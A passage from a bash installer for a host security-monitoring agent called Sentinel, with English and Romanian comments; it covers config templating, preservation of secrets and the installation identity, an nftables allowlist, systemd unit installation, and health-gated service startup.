# deploy, and an auditd restarted at the wrong second would otherwise flip the
# configuration to false and leave it there. A stopped auditd still has its log
# file, and is warned about separately below.
#
# An auditd configured to write somewhere other than AUDITD_LOG_PATH also
# answers no, and that is correct rather than pedantic: the collector opens that
# exact path, so a log kept elsewhere is a log it cannot read.
auditd_feeds_the_collector() {
    have auditctl || return 1
    [[ -f "$AUDITD_LOG_PATH" ]]
}

step_configs() {
    # `scan.containers` is measured, never guessed. `ensure_docker_access` runs
    # unconditionally before this step and leaves the answer in SCAN_CONTAINERS;
    # an empty value means something reordered main, and the quiet alternative
    # would be a configuration claiming a capability nobody checked for.
    if [[ -z "${SCAN_CONTAINERS:-}" ]]; then
        die "internal: ensure_docker_access did not run before step 26, so \
scan.containers would be written on a guess"
    fi

    # NOT a `trap ... RETURN`: without `set -o functrace` a RETURN trap set in a
    # function is not cleared when that function returns, so it fires again on the
    # next function return — run_step's — where $tmp is out of scope and `set -u`
    # aborts with "tmp: unbound variable". Explicit cleanup at the end avoids the
    # leak; a mid-way `die` exits the whole installer anyway, and a stray mktemp
    # dir in /tmp is harmless.
    local tmp; tmp="$(mktemp -d)"

    local hostname_fqdn iface bpf extra_allow
    hostname_fqdn="$(hostname -f 2>/dev/null || hostname)"
    iface="$(ip route show default 2>/dev/null | awk '/default/ {print $5; exit}')"
    iface="${iface:-eth0}"

    # Seed the admin address into response.extra_allowlist so the ROOT EXECUTOR
    # refuses to block it, not just the nftables allowlist (which only wins the
    # accept/drop race). Empty when no admin IP was determined — a bare `[]`.
    extra_allow=""
    [[ -n "${ADMIN_IP:-}" ]] && extra_allow="\"${ADMIN_IP}\""

    # Preflight may have identified a dominant flow worth excluding. Pre-filling
    # it beats leaving the operator to discover the disk is full.
    bpf=""
    [[ -n "${BPF_HINT:-}" ]] && bpf="not host ${BPF_HINT}"

    local auditd_enabled=false
    if auditd_feeds_the_collector; then
        auditd_enabled=true
        if ! systemctl is-active --quiet auditd 2>/dev/null; then
            warn "auditd is installed but its service is not running. ingest.auditd stays \
true — ${AUDITD_LOG_PATH} is there — but nothing new is being written to it. Start it with: \
systemctl enable --now auditd"
        fi
    else
        warn "no auditd on this host (auditctl missing, or ${AUDITD_LOG_PATH} absent), so \
ingest.auditd is written as FALSE rather than pointed at a file that will not exist.
    What that costs: every host.* detection, plus auth.new_user and auth.new_ssh_key.
    The rules sentinel_identity, sentinel_ssh, sentinel_cron, sentinel_systemd,
    sentinel_webroot, sentinel_exec, sentinel_priv and sentinel_cmd have nothing to load them.
    Install auditd and re-run this step:  --force-step 26"
    fi

    # PLATFORM_FAMILY comes straight from the `distro_detect` this process ran at
    # startup — NOT from preflight.env. preflight.env is sourced by
    # resolve_config, which runs AFTER that detection, so routing the family
    # through it would let a stale file from an earlier run on another host
    # override the live answer. One detection, one value, no second opinion.
    sed -e "s|@@DOMAIN@@|${DOMAIN}|g" \
        -e "s|@@HOSTNAME@@|${hostname_fqdn}|g" \
        -e "s|@@PLATFORM_FAMILY@@|${DISTRO_FAMILY}|g" \
        -e "s|@@NGINX_MODE@@|${NGINX_MODE}|g" \
        -e "s|@@PUBLIC_PORT@@|${PUBLIC_PORT}|g" \
        -e "s|@@IFACE@@|${iface}|g" \
        -e "s|@@BPF_FILTER@@|${bpf}|g" \
        -e "s|@@SURICATA_ENABLED@@|$( (( SURICATA_OK )) && echo true || echo false )|g" \
        -e "s|@@AUDITD_ENABLED@@|${auditd_enabled}|g" \
        -e "s|@@SCAN_CONTAINERS@@|${SCAN_CONTAINERS}|g" \
        -e "s|@@TELEGRAM_CHAT_ID@@|${SECRETS[TELEGRAM_CHAT_ID]:-0}|g" \
        -e "s|@@EXTRA_ALLOWLIST@@|${extra_allow}|g" \
        "${SCRIPT_DIR}/config/sentinel.yaml.tmpl" > "${tmp}/sentinel.yaml"

    install_config "${tmp}/sentinel.yaml" "${SENTINEL_CONFIG_DIR}/sentinel.yaml" 0640
    install_config "${SCRIPT_DIR}/config/inventory.yaml.example" \
                   "${SENTINEL_CONFIG_DIR}/inventory.yaml" 0640
    install_config "${SCRIPT_DIR}/config/detection.yaml.example" \
                   "${SENTINEL_CONFIG_DIR}/detection.yaml" 0640
    install_config "${SCRIPT_DIR}/config/notifications.yaml.example" \
                   "${SENTINEL_CONFIG_DIR}/notifications.yaml" 0640

    # Sentinel ships NO logrotate configuration, and removes the one earlier
    # versions installed.
    #
    # It claimed /var/log/nginx/sentinel-*.log and /var/log/suricata/*, all of
    # which the nginx and suricata packages already rotate. logrotate treats a
    # path claimed twice as a fatal error and skips BOTH files entirely — so a
    # config written to guarantee rotation was the reason rotation stopped.
    # Suricata's eve.json and stats.log grew unrotated for days.
    #
    # The `create 0640 nginx adm` line looked load-bearing for the collectors.
    # It was not: step_suricata and step_auxiliary set DEFAULT ACLs on both log
    # directories, so files logrotate creates are readable by the sentinel user
    # whatever mode and owner the distribution's config asks for. The ACL is the
    # mechanism; the logrotate stanza only ever looked like it.
    if [[ -f /etc/logrotate.d/sentinel ]]; then
        rm -f /etc/logrotate.d/sentinel
        ok "removed /etc/logrotate.d/sentinel (it duplicated distribution-owned paths)"
    fi

    # Validate what is left. A duplicate claimed by any package silently stops
    # rotating the file it names, and the first symptom is a full disk.
    if have logrotate && ! logrotate --debug /etc/logrotate.conf >/dev/null 2>&1; then
        warn "logrotate reports a configuration error. Rotation may be stopped for \
some files. Inspect with:  logrotate --debug /etc/logrotate.conf"
    fi

    rm -rf "$tmp"
}

# --- 27 -------------------------------------------------------------------
# Keys generated on this host, never transferred, and — critically — never
# regenerated. Both are used to encrypt or sign things that OUTLIVE the install:
#
#   SENTINEL_SESSION_SECRET     encrypts every stored TOTP secret
#   TELEGRAM_CALLBACK_HMAC_KEY  signs outstanding approval buttons
#
# Rotating either one silently invalidates credentials the operator still holds.
# The first version of this checked for an existing value in the EMPTY temp file
# it had just created, so the check never matched and a fresh secret was written
# on every run — meaning every re-deploy locked the operator out of their own
# dashboard with "TOTP incorrect", and no message anywhere said why.
GENERATED_SECRET_KEYS=(TELEGRAM_CALLBACK_HMAC_KEY SENTINEL_SESSION_SECRET)

# Keys the DEPLOY CHANNEL may set. This is not a list of what the file may
# contain — everything already in the file is carried forward regardless, see
# step_secrets. It is a list of what a value arriving on stdin is allowed to
# name.
#
# THIS IS NOT A PRIVILEGE BOUNDARY, and an earlier version of this comment
# claimed it was: it said secrets.env is an EnvironmentFile for units that run
# as root, so an invented name could set a root process's environment. That is
# false. No unit references this file at all — sentinel/config.py:load_secrets
# reads it directly, looks up a fixed set of names, and nothing else is ever
# consulted. An unknown name in the file is inert. Written down because a
# security reason nobody can check is a constraint the next person preserves
# without knowing why.
#
# The real reason is duller and still good: a name this installer does not know
# is far more likely a typo in secrets/.env.local (SENTINEL_DB_PASWORD=) than a
# new secret. Writing it would leave the operator with a rotation that looked
# like it worked while the real key kept its old value. So stdin may set a name
# this installer knows or one this host already has — and a name it invents is
# refused out loud, with the fix: put it on the host once, and every later run
# carries it.
#
# SENTINEL_BEACON_SECRET and SENTINEL_SHIP_SECRET joined the list on 19 August
# 2026. Both are HALF OF A PAIR held by a party outside this host — the external
# witness and the aggregator — so neither may ever be generated here, and both
# must be settable on a host that has never had one. Until now the only way to
# place either was to write it into secrets.env by hand and let a later run
# carry it forward, which meant the documented path for a shipped feature began
# with an undocumented manual step performed as root.
#
# The beacon key is the proof that the gap has teeth, and the comment above
# records it: its absence from these lists is what turned `--force-step 22,27`
# into a rotation that destroyed the only copy of a key nothing could restore.
# Carrying keys forward fixed the destruction. It did not give either key a way
# in, and a key with no way in is a key that gets placed by hand, once, by
# whoever remembers.
OPERATOR_SECRET_KEYS=(ANTHROPIC_API_KEY TELEGRAM_BOT_TOKEN TELEGRAM_CHAT_ID
                      SENTINEL_DB_PASSWORD TELEGRAM_APPLY_PIN
                      SENTINEL_BEACON_SECRET SENTINEL_SHIP_SECRET)

# Read a key out of the secrets file already on disk, if there is one.
#
# Leading whitespace is allowed for the same reason step_secrets allows it when
# it decides which keys exist: the two must agree. If the scan accepts an
# indented `  KEY=value` and this does not, the key is kept in the new file with
# its value silently emptied — a deletion wearing the shape of a preservation.
existing_secret() {
    local target="${SENTINEL_CONFIG_DIR}/secrets.env" key="$1"
    [[ -r "$target" ]] || return 1
    local line
    line="$(grep -m1 "^[[:space:]]*${key}=" "$target" 2>/dev/null)" || return 1
    printf '%s' "${line#*=}"
}

# Identitatea instalării: o valoare aleatoare, generată o dată și niciodată din
# nou. Aceleași reguli ca la GENERATED_SECRET_KEYS de mai sus, din același
# motiv: valoarea supraviețuiește instalării și altcineva o ține minte.
#
# De ce nu hostname: se schimbă (redenumire, migrare, un panou care recreează
# VPS-ul), iar o identitate schimbată bifurcă istoria unui server în două pe un
# agregator care adună mai multe. E și recunoaștere gratuită acolo — spune cui
# se uită cum se cheamă mașinile operatorului.
#
# De ce nu /etc/machine-id: o mașină clonată îl moștenește. Două servere cu
# aceeași identitate e exact eșecul pe care valoarea aleatoare îl evită, și e
# singurul care nu produce niciun raport de defecțiune nicăieri: agregatorul
# contopește două istorii într-una și cifrele doar încetează să însemne ce spun.
#
# Deci: un fișier existent se duce mai departe NEATINS, iar unul cu conținut
# nerecunoscut nu se rescrie — se semnalează. Poate fi singura copie a unei
# valori pe care agregatorul o cunoaște deja.
# Citește fișierul de identitate ÎNTR-O VARIABILĂ, sau refuză să pretindă că
# poate. Valoarea ajunge în INSTANCE_ID_READ; codul de ieșire spune de ce nu:
#
#   0  s-a citit; INSTANCE_ID_READ e conținutul fără spațiul de la capete
#   1  fișierul nu există
#   2  fișierul EXISTĂ dar nu poate fi reprezentat aici (conține NUL)
#   3  nu s-a putut măsura fișierul — nu se știe nimic despre el
#
# Motivul pentru care e o funcție și nu două linii repetate: o variabilă de
# shell NU poate conține octetul NUL. `$(cat fișier)` îl aruncă tăcut (bash
# scrie „ignored null byte in input" pe stderr și continuă cu restul), deci un
# fișier care conține „<32 de hexa><NUL>" ajungea aici drept identitate perfect
# validă — în timp ce `Path.read_text()` din sentinel/identity.py îl păstrează
# și refuză valoarea de 33 de caractere.
#
# Nu e o coliziune teoretică: e chiar forma pe care o ia coruperea de care
# vorbește comentariul de la re-citire. Un ext4/xfs care pierde curentul la
# mijlocul unei scrieri completează blocul cu NUL, nu trunchiază fișierul. Deci
# garda pusă anume pentru scrierea parțială era oarbă exact la varianta ei cea
# mai probabilă, iar rezultatul era: instalare verde, iar peste ore
# „⚪ Nu pot citi identitatea instalării" despre fișierul pe care instalatorul
# tocmai îl garantase.
#
# Se compară numărul de octeți cu și fără NUL ÎNAINTE de orice citire în
# variabilă. Egale = fișierul poate fi reprezentat aici; diferite = nu poate, și
# atunci singurul răspuns onest e că nu e o identitate.
#
# LIMITĂ CUNOSCUTĂ, lăsată dinadins: fișierul e măsurat de două ori și citit a
# treia oară, deci un NUL apărut între măsurare și citire ar trece. Nimic
# altceva nu scrie /etc/sentinel/instance_id — pasul ăsta e singurul scriitor,
# iar fișierul e 0640 root:sentinel — deci fereastra nu e accesibilă în
# practică. Închiderea ei înseamnă citirea octeților O SINGURĂ dată, printr-o
# codare care îi poate purta pe toți (`od`, `base64`), nu măsurare-apoi-citire.
# Scrisă aici fiindcă o limită nedocumentată e cea care se descoperă târziu.
INSTANCE_ID_READ=""

read_instance_id_file() {
    local path="$1" total nulless value
    INSTANCE_ID_READ=""
    [[ -f "$path" ]] || return 1

    total="$(wc -c < "$path" 2>/dev/null | tr -d '[:space:]' || true)"
    nulless="$(LC_ALL=C tr -d '\000' < "$path" 2>/dev/null | wc -c | tr -d '[:space:]' || true)"
    [[ -n "$total" && -n "$nulless" ]] || return 3
    [[ "$total" == "$nulless" ]] || return 2

    # Se taie DOAR spațiul de la capete, exact cele șase caractere pe care le
    # taie și `str.strip(" \t\n\r\v\f")` din sentinel/identity.py, celălalt
    # cititor al aceluiași fișier. Un `tr -d '[:space:]'` ar fi scos și spațiul
    # dinăuntru, deci un fișier editat de mână în „0123 4567…" ar fi trecut aici
    # drept valid și ar fi fost refuzat acolo — instalare verde, autoverificare
    # roșie, despre același fișier.
    value="$(cat "$path" 2>/dev/null || true)"
    value="${value#"${value%%[![:space:]]*}"}"
    value="${value%"${value##*[![:space:]]}"}"
    INSTANCE_ID_READ="$value"
    return 0
}

ensure_instance_id() {
    local target="${SENTINEL_CONFIG_DIR}/instance_id" current="" written="" rc=0

    rc=0; read_instance_id_file "$target" || rc=$?
    current="$INSTANCE_ID_READ"

    if (( rc == 3 )); then
        # Nici „are identitate", nici „nu are". A genera peste un fișier despre
        # care nu se știe nimic e singurul lucru ireversibil de aici.
        die "nu pot măsura ${target}; refuz să decid dacă gazda are deja identitate"
    fi

    if (( rc == 2 )); then
        warn "${target} conține octeți NUL, deci nu e o identitate — și nu poate fi"
        warn "citit corect nici măcar de shell. Așa arată o scriere întreruptă: un"
        warn "sistem de fișiere completează blocul cu NUL, nu taie fișierul."
        warn "NU a fost rescris. Uită-te în el:  od -c ${target}"
        warn "Dacă nu e o identitate, șterge-l și re-rulează pasul:"
        warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
        return 0
    fi

    if [[ -n "$current" ]]; then
        if [[ ! "$current" =~ ^[0-9a-f]{32}$ ]]; then
            warn "${target} există dar nu conține o identitate validă (se așteaptă 32"
            warn "de caractere hexa minuscule). NU a fost rescris, dinadins: dacă"
            warn "valoarea veche a ajuns vreodată la un agregator, suprascrierea ar"
            warn "rupe istoria acestui server în două. Uită-te în el; dacă nu e o"
            warn "identitate, șterge-l și re-rulează pasul:"
            warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
            # `return`, nu `current=""`: căderea în ramura de mai jos ar fi
            # tipărit linia verde „identitatea instalării păstrată" peste un
            # fișier despre care tocmai s-a spus că nu e o identitate.
            return 0
        fi
        # Modul și proprietarul se reafirmă și pe un fișier păstrat. Procesele
        # rulează ca ${SENTINEL_USER} și citesc prin GRUP; un fișier rămas
        # 0600 root:root după o restaurare din backup face identitatea
        # necitibilă, iar simptomul nu apare aici, ci peste ore, ca o
        # autoverificare „nu pot citi identitatea".
        chown "root:${SENTINEL_USER}" "$target"
        chmod 0640 "$target"
        ok "identitatea instalării păstrată (${current:0:8}…) — nu se regenerează niciodată"
        return 0
    fi

    [[ -f "$target" ]] && warn "${target} era gol — nu e nimic de păstrat, se generează"

    have openssl || die "openssl lipsește; nu pot genera identitatea instalării"

    # Modul corect ÎNAINTE de conținut, ca la secrets.env: a scrie întâi și a da
    # chmod după lasă o fereastră în care fișierul e lizibil de oricine.
    ( umask 077; : > "${target}.tmp" )
    chown "root:${SENTINEL_USER}" "${target}.tmp"
    chmod 0640 "${target}.tmp"
    openssl rand -hex 16 > "${target}.tmp" || die "openssl rand a eșuat"
    mv "${target}.tmp" "$target"

    # Ce dovedește că a mers: valoarea RECITITĂ de pe disc are forma cerută.
    # Codul de ieșire al lui openssl nu spune nimic despre ce a ajuns în fișier
    # — redirectarea e a shell-ului, nu a lui, iar un disc plin sau o cotă atinsă
    # lasă în urmă un fișier gol sau trunchiat. O identitate trunchiată se
    # coliziona cu alta la fel de trunchiată, și nimic n-ar fi spus-o.
    #
    # Prin `read_instance_id_file`, nu printr-un `$(cat …)` direct, din același
    # motiv pentru care există funcția: substituția de comandă aruncă NUL, deci
    # o scriere parțială completată cu NUL — forma cea mai probabilă a exact
    # eșecului descris mai sus — ar fi trecut de propria ei gardă.
    # CONSECINȚĂ CUNOSCUTĂ: fișierul stricat rămâne pe disc, iar fiecare rulare
    # de după el îl refuză, deci gazda nu capătă identitate până nu-l șterge un
    # om — chiar dacă valoarea fusese bătută cu o secundă înainte și n-a văzut-o
    # niciun agregator. Acceptată dinadins: pasul nu are memoria fișierului pe
    # care tocmai l-a scris, deci nu poate deosebi „e al meu, de acum" de „era
    # aici dinainte", iar a doua e valoarea pe care nu are voie s-o distrugă.
    # Mesajele de mai jos spun exact ce e de făcut.
    rc=0; read_instance_id_file "$target" || rc=$?
    written="$INSTANCE_ID_READ"
    (( rc == 0 )) \
        || die "identitatea scrisă în ${target} nu se poate reciti (cod ${rc})"
    [[ "$written" =~ ^[0-9a-f]{32}$ ]] \
        || die "identitatea scrisă în ${target} nu se recitește ca 32 de caractere hexa"

    ok "identitate de instalare generată: ${written:0:8}… (${target}, 0640 root:${SENTINEL_USER})"
}

step_secrets() {
    local target="${SENTINEL_CONFIG_DIR}/secrets.env"

    # Create with the right mode BEFORE any content exists. Writing first and
    # chmod'ing after leaves a window in which the file is world-readable.
    ( umask 077; : > "${target}.tmp" )
    chown "root:${SENTINEL_USER}" "${target}.tmp"
    chmod 0640 "${target}.tmp"

    # EVERY key already in the file is carried over, whatever its name.
    #
    # This step used to rebuild the file from two hard-coded lists and nothing
    # else, so a re-run deleted every key outside them. SENTINEL_BEACON_SECRET
    # was added to this host after those lists were written, which made the
    # documented password rotation (--force-step 22,27) destroy the only copy of
    # it: it is not in secrets/.env.local, so stdin cannot restore it, and it
    # must never be regenerated because the external watcher holds the same
    # value and the pair is the whole point.
    #
    # It would also have failed in silence at both ends. This step prints a
    # green line about the keys it DID keep, and sentinel-beacon exits 0 when
    # the secret is missing (deliberately — see the unit), so `systemctl
    # restart` returns 0 over a unit that is now dead and step 36 reports
    # "enabled and restarted".
    #
    # A hard-coded list of keys-to-preserve ages exactly like a hard-coded list
    # of steps: quietly, at the next key added, and the symptom arrives months
    # later during an unrelated rotation.
    local key value line stripped kept=0 made=0 lineno=0
    local -a ordered=() carried=() unparsed=() on_disk=()

    for key in "${OPERATOR_SECRET_KEYS[@]}" "${GENERATED_SECRET_KEYS[@]}"; do
        ordered+=("$key")
    done

    if [[ -r "$target" ]]; then
        while IFS= read -r line || [[ -n "$line" ]]; do
            lineno=$((lineno + 1))
            # Leading whitespace off before deciding what the line is: an
            # indented comment is a comment, and an indented KEY=value is a key
            # — that is how sentinel/config.py reads this file, so treating
            # either as garbage would report a loss that had not happened, or
            # cause one that had not been asked for.
            stripped="${line#"${line%%[![:space:]]*}"}"
            [[ -z "$stripped" || "$stripped" == \#* ]] && continue
            if [[ ! "$stripped" =~ ^([A-Za-z_][A-Za-z0-9_]*)= ]]; then
                # Never the content: this file is nothing but secrets. The line
                # number is enough to find it, and cannot leak a value.
                unparsed+=("$lineno")
                continue
            fi
            key="${BASH_REMATCH[1]}"
            on_disk+=("$key")
            in_list "$key" "${ordered[@]}" || { ordered+=("$key"); carried+=("$key"); }
        done < "$target"
    fi

    {
        echo "# Generated by install.sh at $(date -u +%Y-%m-%dT%H:%M:%SZ)"
        echo "# Mode 0640 root:sentinel. Never commit, never copy, never echo."

        for key in "${ordered[@]}"; do
            # Precedence: what was just handed to us wins, then whatever is
            # already on disk. An upgrade run that supplies no secrets must not
            # erase the ones that are working.
            value="${SECRETS[$key]:-}"
            [[ -z "$value" ]] && value="$(existing_secret "$key" || true)"

            # Host-generated keys, and only those, may be created from nothing.
            if in_list "$key" "${GENERATED_SECRET_KEYS[@]}"; then
                if [[ -n "$value" ]]; then
                    kept=$((kept + 1))
                else
                    value="$(openssl rand -hex 32)"
                    made=$((made + 1))
                fi
            fi

            # An empty value is still written IF the key was in the old file.
            # Reporting a key as carried over and then dropping it because its
            # value happened to be empty is intent reported as effect — the
            # exact shape this whole change exists to remove — and it would also
            # make the key-name diff in OPERARE.md §11 (a) show a loss.
            if [[ -n "$value" ]] || in_list "$key" ${on_disk[@]+"${on_disk[@]}"}; then
                printf '%s=%s\n' "$key" "$value"
            fi
        done
    } >> "${target}.tmp"

    mv "${target}.tmp" "$target"
    ok "secrets written to ${target} (0640 root:${SENTINEL_USER})"
    (( kept )) && ok "kept ${kept} existing key(s) — TOTP enrolments stay valid"
    if (( ${#carried[@]} )); then
        ok "carried over ${#carried[@]} key(s) this installer does not manage: ${carried[*]}"
    fi
    if (( ${#unparsed[@]} )); then
        warn "${#unparsed[@]} line(s) in the previous ${target} were neither a comment"
        warn "nor KEY=value and were NOT carried over — line(s): ${unparsed[*]}"
        warn "The old file is gone; recover them from a backup if they mattered."
    fi
    if (( made )); then
        warn "generated ${made} new key(s). If this host had TOTP enrolments"
        warn "from an older secret, they must be re-enrolled:"
        warn "    sudo sentinel web --enroll-totp --username <user>"
    fi

    # A value supplied on stdin under a name this host has never had is dropped
    # — see OPERATOR_SECRET_KEYS for why — but never in silence: the operator
    # put it there on purpose and would otherwise be left believing it landed.
    if (( ${#SECRETS[@]} )); then
        for key in "${!SECRETS[@]}"; do
            in_list "$key" "${ordered[@]}" && continue
            # The name is only safe to print once it looks like a name. The
            # stdin reader already refuses anything else, and this is the second
            # lock on the same door: a caller that populates SECRETS some other
            # way must not be able to turn a wrapped secret into a log line.
            if [[ ! "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]]; then
                warn "a value supplied on stdin carries a name that is not an \
environment variable name; it was NOT saved. The name is withheld on purpose — on a \
malformed line it is secret material, not a name."
                continue
            fi
            warn "${key} was supplied on stdin but this installer does not write it \
and this host does not already have it. It was NOT saved. If it belongs here, add it \
to ${target} on the host first; a later run will then carry it over."
        done
    fi

    unset SECRETS
}

# --- 28 -------------------------------------------------------------------
step_migrate() {
    "${SENTINEL_PREFIX}/bin/sentinel" migrate || die "database migrations failed"
    ok "schema up to date"
}

# --- 29 -------------------------------------------------------------------
step_nftables() {
    # ORDERING IS THE SAFETY PROPERTY HERE.
    #
    # The allowlist set is created and populated with the operator's address
    # BEFORE the chain containing the drop rules exists. If this script were
    # interrupted between the two, the worst case is a table with an allowlist
    # and no drops — which blocks nobody.
    #
    # The base chain is `policy accept`. Sentinel is a deny-lister, not a
    # firewall. It cannot lock anyone out by failing; only by explicitly
    # blocking them.
    nft -f "${SCRIPT_DIR}/nftables/sentinel-table.nft" || die "failed to load the nftables table"

    local -a allow=("127.0.0.0/8" "10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16")
    [[ -n "$ADMIN_IP" ]] && allow+=("${ADMIN_IP}/32")

    # Operator-supplied entries from the config: uptime monitors, CI runners,
    # office ranges, any high-volume source that must not be cut off.
    if [[ -f "${SENTINEL_CONFIG_DIR}/sentinel.yaml" ]]; then
        while read -r cidr; do
            [[ -n "$cidr" ]] && allow+=("$cidr")
        done < <(awk '/extra_allowlist:/{f=1;next} f&&/^ *- /{gsub(/^ *- *|["\x27]/,"");print;next} f&&NF&&!/^ *#/{exit}' \
                 "${SENTINEL_CONFIG_DIR}/sentinel.yaml" 2>/dev/null || true)
    fi

    while read -r ip; do
        [[ "$ip" == *:* ]] || allow+=("${ip}/32")
    done < <(public_ips)

    for host in api.telegram.org api.anthropic.com; do
        while read -r ip; do
            [[ -n "$ip" ]] && allow+=("${ip}/32")
        done < <(getent ahostsv4 "$host" 2>/dev/null | awk '{print $1}' | sort -u)
    done

    for cidr in "${allow[@]}"; do
        nft add element inet sentinel allowlist_v4 "{ ${cidr} }" 2>/dev/null || true
    done
    ok "nftables table loaded; ${#allow[@]} allowlist entries, blocklist empty"

    # -- Persist the RULESET and the ALLOWLIST, but never the blocklist -------
    #
    # The table does not survive a reboot, and until now nothing recreated it:
    # a host came back with no `inet sentinel` at all, so every block — manual
    # or automatic — failed silently for a day. The executor now reloads these
    # two files at startup.
    #
    # The split is the point. Allowlist entries MUST come back with the table,
    # because a table with drop rules and no allowlist is how you firewall your
    # own address. Blocks must NOT come back, because "rebooting is always a way
    # out of a self-inflicted block" is a guarantee this design makes and the
    # operator has been told to rely on.
    install -d -m 0755 -o root -g root "${SENTINEL_PREFIX}/libexec"
    install -m 0644 -o root -g root "${SCRIPT_DIR}/nftables/sentinel-table.nft"         "${SENTINEL_PREFIX}/libexec/sentinel-table.nft"
    {
        echo "# Generated by install.sh. Loaded by the executor when the table"
        echo "# is missing at startup. Blocks are deliberately NOT persisted."
        for cidr in "${allow[@]}"; do
            echo "add element inet sentinel allowlist_v4 { ${cidr} }"
        done
    } > "${SENTINEL_PREFIX}/libexec/sentinel-allowlist.nft"
    chown root:root "${SENTINEL_PREFIX}/libexec/sentinel-allowlist.nft"
    chmod 0644 "${SENTINEL_PREFIX}/libexec/sentinel-allowlist.nft"
    ok "allowlist persisted for restart (${#allow[@]} entries)"

    nft list set inet sentinel allowlist_v4 | sed 's/^/    /'
}

# --- 30 -------------------------------------------------------------------
step_systemd() {
    # Hardening lives inline in each unit file, deliberately. A drop-in under
    # /etc/systemd/system/service.d/ would apply to EVERY service on the host,
    # including whatever was already running. Confining someone else's
    # production workload as a side effect of installing a monitoring agent is
    # not ours to do.
    for unit in "${SCRIPT_DIR}"/systemd/*.service "${SCRIPT_DIR}"/systemd/*.timer; do
        [[ -f "$unit" ]] || continue
        install -m 0644 "$unit" "/etc/systemd/system/$(basename "$unit")"
    done

    systemctl daemon-reload
    ok "systemd units installed"
}

# --- 31 -------------------------------------------------------------------
step_discovery() {
    sudo -u "$SENTINEL_USER" "${SENTINEL_PREFIX}/bin/sentinel" scan --discovery-only \
        2>/dev/null || warn "asset discovery is not available in this build (arrives in P2)"

    cat <<EOF

  Review ${SENTINEL_CONFIG_DIR}/inventory.yaml before enabling active scanning.
  Discovery proposes; it never confirms. An asset is not scanned with DAST until
  you set confirmed_by_operator: true on it — scanning something you do not own
  is not Sentinel's decision to make.

EOF
}

# --- 32 -------------------------------------------------------------------
# Cat timp supraveghem fiecare serviciu dupa pornire, inainte sa trecem la
# urmatorul. Trebuie sa depaseasca cel mai lung RestartSec din deploy/systemd/
# (azi 10s), ca o repornire automata sa aiba loc INAUNTRU si sa fie vazuta.
SERVICE_SETTLE_S=${SERVICE_SETTLE_S:-15}

step_start_services() {
    # One at a time, each behind a health gate. Starting six units at once and
    # then discovering three are broken is a much worse debugging session.
    # EVERY unit, not just two. A deploy that installs new code and restarts
    # only the executor and the web app leaves ingest, detect, ai and telegram
    # running the OLD code until somebody notices — which is a partial upgrade
    # that reports success, and the hardest kind of state to reason about
    # afterwards ("is this bug fixed on the server or not?").
    #
    # Ordered: the executor first because others talk to it, telegram last
    # because its restart is the most visible.
    local -a order=(sentinel-executor sentinel-web sentinel-ingest
                    sentinel-detect sentinel-ai sentinel-telegram)

    for unit in "${order[@]}"; do
        [[ -f "/etc/systemd/system/${unit}.service" ]] || { info "${unit}: not in this build"; continue; }

        systemctl enable "$unit" >/dev/null 2>&1 || true
        systemctl restart "$unit" || die "${unit} failed to start. journalctl -u ${unit} -n 50"

        local waited=0
        while (( waited < 10 )); do
            if systemctl is-active --quiet "$unit"; then break; fi
            sleep 1; waited=$((waited + 1))
        done

        if ! systemctl is-active --quiet "$unit"; then
            journalctl -u "$unit" -n 30 --no-pager >&2
            die "${unit} did not stay running. Nothing further will be started."
        fi

        # `is-active` o dată nu dovedeşte că serviciul RĂMÂNE pornit.
        #
        # Un proces care moare la pornire şi e repornit de systemd trece prin
        # `active` la fiecare ciclu, iar o verificare care se uită o dată îl
        # prinde exact acolo. Aşa a trecut de poarta asta un bot de Telegram care
        # crăpa în `build_application`: deploy-ul a raportat „active", iar
        # contorul de reporniri a ajuns la 1113 înainte să observe cineva că
        # nu mai vine nicio alertă.
        #
        # Numărul de reporniri e dovada. Dacă creşte cât ne uităm, unitatea e în
        # buclă, oricât de `active` ar părea la un moment dat.
        # Supravegheat, nu eşantionat la un moment calculat.
        #
        # O versiune anterioară deducea fereastra din `RestartUSec`, pe premisa
        # că systemd o dă în microsecunde. Nu o dă: systemd 252 formatează
        # întotdeauna uman — `2s`, `10s`, `100ms`. Extrăgând cifrele, `100ms`
        # devenea 100 şi producea o fereastră de 105 secunde per unitate, iar
        # `1min` devenea 1 şi producea una de 8 secunde, mai SCURTĂ decât
        # intervalul de repornire — exact defectul pe care schimbarea pretindea
        # că îl elimină.
        #
        # Nu e nevoie de niciun calcul. Un proces care moare petrece timp în
        # `activating` până la repornire, oricât de lung ar fi intervalul, iar
        # unul care reporneşte repede creşte contorul. Verificate amândouă, o
        # dată pe secundă. Prima abatere opreşte instalarea; nu aşteptăm restul
        # ferestrei ca să confirmăm ce ştim deja.
        local before now_state waited=0
        before="$(systemctl show "$unit" -p NRestarts --value 2>/dev/null)"
        while (( waited < SERVICE_SETTLE_S )); do
            sleep 1; waited=$((waited + 1))
            now_state="$(systemctl is-active "$unit" 2>/dev/null || true)"
            if [[ "$now_state" != "active" ]]; then
                journalctl -u "$unit" -n 40 --no-pager >&2
                die "${unit} nu a rămas pornit: după ${waited}s e '${now_state:-necunoscut}'.
    'active' la o singură verificare nu înseamnă nimic pentru un proces care
    moare şi e repornit. Nu pornesc nimic mai departe."
            fi
            local nrestarts
            nrestarts="$(systemctl show "$unit" -p NRestarts --value 2>/dev/null)"
            if [[ "$nrestarts" != "$before" ]]; then
                journalctl -u "$unit" -n 40 --no-pager >&2
                die "${unit} se reporneşte în buclă: ${before} → ${nrestarts} reporniri în ${waited}s.
    Nu pornesc nimic mai departe."
            fi
        done
        ok "${unit} active şi stabil ${SERVICE_SETTLE_S}s (${before:-?} reporniri)"
    done

    # Reconciliation runs at boot AND hourly. Boot is the main event — that
    # is when the kernel loses every block — but a table can also be dropped
    # while the host stays up, by another tool or by hand.
    systemctl enable sentinel-reconcile.service >/dev/null 2>&1 \
        && ok "sentinel-reconcile.service enabled (runs at boot)"

    for unit in sentinel-health.timer sentinel-maintenance.timer \
                sentinel-watchdog.timer sentinel-selfcheck.timer \
                sentinel-reconcile.timer; do
        [[ -f "/etc/systemd/system/${unit}" ]] && systemctl enable --now "$unit" >/dev/null 2>&1 \
            && ok "${unit} enabled"
    done

    start_beacon_unit /etc/systemd/system/sentinel-beacon.service
    start_shipper_unit /etc/systemd/system/sentinel-shipper.service
}

# Repornirea beaconului, cu poarta pe care nu o poate trece un expeditor mut.
#
